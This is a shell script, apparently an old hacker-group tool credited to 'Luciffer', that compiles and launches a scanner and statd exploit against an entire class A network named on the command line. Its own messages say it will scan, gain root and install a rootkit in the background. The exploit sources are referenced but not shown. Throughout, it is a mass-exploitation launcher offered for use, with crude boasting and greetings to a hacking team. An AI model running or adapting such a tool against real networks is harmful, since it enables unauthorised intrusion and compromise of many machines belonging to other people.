#!/bin/sh
blink="[5m"
cl="[0m"
mag="[35m"
cyn="[36m"
wht="[37m"
red="[31m"
hblk="[1;30m"
hmag="[1;35m"
hcyn="[1;36m"
hwht="[1;37m"
hred="[1;31m"
bblk="[40m"
bred="[41m"
bmag="[45m"
bcyn="[46m"
bwht="[47m"
bg="[44m"
rver="${cl}${hblk}[${cl}${hcyn}statd ${cl}${cyn}class${cl}${hblk}a${cl}${hblk}]${cl}${mag}:${cl}${wht}"

clear
echo " "
echo "${cyn}http${hblk}:${cyn}//${hblk}www${cyn}.${hblk}luciffer${cl}${cyn}.${cl}${hblk}org${cl}${cyn}${cl}${hblk}${cl}"
echo " "
echo "${cl}${cyn}----${cl}${hblk}[${cl}${cyn}luciffer${cl}${hblk}@${cl}${cyn}luciffer${cl}${hblk}${cl}.${cyn}${cl}org${hblk}]${cl}${cyn}----" 
echo " "
echo -n "$rver checking for all the bitches arguments..."
if [ "$1" = "" ]; then
 echo " ${cyn}${blink}no${cl}${wht}."
 echo ""
 echo "$rver usage is $0 123 .That is all what u need to do.123 is a class A for h4x0r|ng. "
 exit 0
fi
echo " ${cyn}right ${hblk}on${cl}"
echo ""

if [ "$1" = "" ]; then
   echo "Enter class A net to scan and h4x0r it for u."
   exit 1
fi
   echo "$rver class a ${cl}${hblk} statd${cl}${cyn}${cl}${hblk} scaner-h4x0r${cl}${cyn} by ${cl}${hblk}Luciffer" 
   if [ -x luckscan ] && [ -x luckstatdx ]; then
   echo "$rver Statdx class A scanner-h4x0r"
   else
   echo ""
   echo "$rver This will take a few moments go take a shit or something.."
   echo "Program was launched in background,it will scan,get root and install a rOOtKiT for U."
   echo "My master is Luciffer:luciffer@luciffer.org"
   echo "Greeting to :wRc,TaUnE from RHT (Romanian Hacking Team http://rht.sh) !"
   echo ""
   gcc -o luckscan-a luckscan-a.c  > /dev/null 2>&1
   gcc -o luckstatdx luckstatdx.c  > /dev/null 2>&1
fi

if [ -f scan.log ]; then
   rm -f scan.log
fi

./luckscan-a $1 111 $2 $3
#cat scan.log  | while read IP; do ./am $IP; done | grep  "Yes" | cut -s -d":" -f2
 
